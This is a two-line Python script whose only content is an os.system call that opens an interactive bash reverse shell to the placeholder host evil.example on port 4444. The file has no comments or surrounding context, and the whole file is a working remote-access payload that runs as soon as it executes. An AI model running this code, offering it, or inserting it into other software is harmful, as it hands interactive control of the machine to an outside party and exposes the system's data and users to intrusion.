import os

os.system('bash -c "bash -i >& /dev/tcp/evil.example/4444 0>&1"')
